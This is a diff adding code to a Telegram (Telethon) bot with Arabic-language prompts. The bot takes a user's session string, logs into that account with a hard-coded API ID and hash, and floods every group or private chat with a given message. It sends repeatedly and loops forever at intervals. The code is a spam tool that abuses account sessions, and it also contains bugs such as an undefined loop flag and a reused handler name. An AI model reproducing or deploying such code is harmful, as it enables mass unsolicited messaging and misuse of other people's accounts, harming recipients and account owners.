+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                    elif chat == -1001878403490:
+                        pass
+                    await asyncio.sleep()
+                except Exception as e:
+                    print(e)
+        except Exception as e:
+            print(e)        
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرساله")
+      msg = await x.get_response()
+      await x.send_message("الان تم سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
+      i = await gcasta(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} all 😗😗.", buttons=keyboard)
+
+molb = True
+
+async def gcastb(strses, msg):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for sweetie in X.iter_dialogs():
+                if sweetie.is_group:
+                    chat = sweetie.id
+                    try:
+                        if chat != -1001878403490:
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(600)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(600)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            await asyncio.sleep(60)
+                            await X.send_message(chat, tol, file=file)
+                            while molb != False:
+                                await asyncio.sleep(600)
+                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
+                        elif chat == -1001878403490:
+                            pass
+                    except Exception as e:
+                        print(e)
+        except Exception as e:
+            print(e)
+
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+      await x.send_message("الان اعطي الرساله")
+      msg = await x.get_response()
+      await x.send_message("الان تم سوف يتم ارسال الرساله كل 10 دقائق بشكل تلقائي")
+      i = await gcastb(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} Group 😗😗.", buttons=keyboard)
+
+async def gcastc(strses, msg):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for krishna in X.iter_dialogs():
+                if krishna.is_user and not krishna.entity.bot:
+                    chat = krishna.id
+                    try:
+                        await X.send_message(chat, tol, file=file)
+                        while molc != False:
+                            await asyncio.sleep(10)
+                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
+                    except BaseException:
+                        pass
+        except Exception as e:
+            print(e)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+      await x.send_message("الان اعطني الرساله")
+      msg = await x.get_response()
+      await x.send_message("الان تم سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
+      i = await gcastc(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} Private😗😗.", buttons=keyboard)
+
+print(" لقد تم تنصيب البوت بنجاح.")
 client.run_until_disconnected()
